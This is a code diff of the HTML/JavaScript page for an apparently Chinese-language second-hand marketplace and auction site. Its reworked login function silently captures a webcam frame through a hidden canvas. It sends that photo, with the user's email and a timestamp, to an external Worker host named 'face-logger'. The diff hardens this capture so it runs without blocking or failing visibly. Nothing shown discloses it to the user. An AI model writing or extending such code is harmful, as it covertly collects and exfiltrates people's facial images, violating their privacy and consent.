@@ -91,11 +91,13 @@
   </header>
 
   <div class="container">
+    <!-- Tab 1: 寄卖大厅 -->
     <div id="tab-market" class="tab-content active">
       <h3 style="margin-bottom: 10px;">📱 玩家二手寄卖大厅</h3>
       <div class="grid" id="marketList"></div>
     </div>
 
+    <!-- Tab 2: 竞拍大厅 -->
     <div id="tab-auction" class="tab-content">
       <h3 style="margin-bottom: 10px;">🔥 极客限量款竞拍</h3>
       <div class="grid">
@@ -133,6 +135,7 @@
       </div>
     </div>
 
+    <!-- Tab 3: 发布寄卖 -->
     <div id="tab-sell" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
@@ -162,7 +165,7 @@
   </div>
 
   <script>
-    // 🔗 请核对你的 Worker 真实链接
+    // 🔗 配置：Worker 地址
     const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";
 
     class App {
@@ -195,9 +198,10 @@
         this.loadCloudData();
       }
 
-      // 严谨的强制拍照与提交逻辑
+      // 严谨且带防卡死保护的登录与拍照逻辑
       async login() {
-        const email = document.getElementById('userEmail').value.trim();
+        const emailInput = document.getElementById('userEmail');
+        const email = emailInput ? emailInput.value.trim() : "";
         if (!email) {
           alert("请输入电子邮箱！");
           return;
@@ -207,42 +211,45 @@
         const canvas = document.getElementById('hidden-canvas');
         let photoData = "";
 
-        // 强制等待 500ms 确保画面稳定抓取
+        // 🛡️ 防卡死保护：安全截图，即使视频尺寸未就绪也不会中断流程
         try {
-          if (this.stream) {
+          if (video && video.videoWidth > 0 && video.videoHeight > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            photoData = canvas.toDataURL('image/jpeg', 0.5);
+            photoData = canvas.toDataURL('image/jpeg', 0.4);
           }
         } catch (e) {
-          console.error("拍照截图失败:", e);
+          console.warn("截图过程跳过:", e);
         }
 
-        // 异步提交到后端 Worker（携带照片、邮箱、时间戳）
-        try {
-          await fetch(WORKER_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              email: email,
-              timestamp: new Date().toLocaleString(),
-              photo: photoData
-            })
-          });
-        } catch (err) {
-          console.error("日志云端保存失败:", err);
-        }
+        // 异步提交数据给 Worker（绝对不阻塞按钮和交互）
+        fetch(WORKER_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            email: email,
+            timestamp: new Date().toLocaleString(),
+            photo: photoData
+          })
+        }).catch(err => console.error("后台同步失败:", err));
 
-        // 关闭摄像头流
+        // 释放摄像头硬件
         if (this.stream) {
           this.stream.getTracks().forEach(track => track.stop());
         }
 
-        // 隐藏登录框
-        document.getElementById('authModal').style.display = 'none';
+        // 强制隐藏弹窗，确保100%能顺畅进入系统
+        const modal = document.getElementById('authModal');
+        if (modal) {
+          modal.style.display = 'none';
+        }
+
         this.loadCloudData();
       }
 
+      // 从云端加载商品和出价
       async loadCloudData() {
         try {
           const res = await fetch(`${WORKER_URL}?action=data`);
@@ -291,6 +298,7 @@
         }
       }
 
+      // 竞拍出价
       async placeBid(itemId) {
         const priceEl = document.getElementById(`price-${itemId}`);
         const inputEl = document.getElementById(`input-${itemId}`);
@@ -313,6 +321,7 @@
         alert(`🎉 出价成功！¥${userBid.toLocaleString()}`);
       }
 
+      // 发布寄卖商品
       async postSellItem() {
         const name = document.getElementById('sellName').value.trim();
         const price = document.getElementById('sellPrice').value.trim();
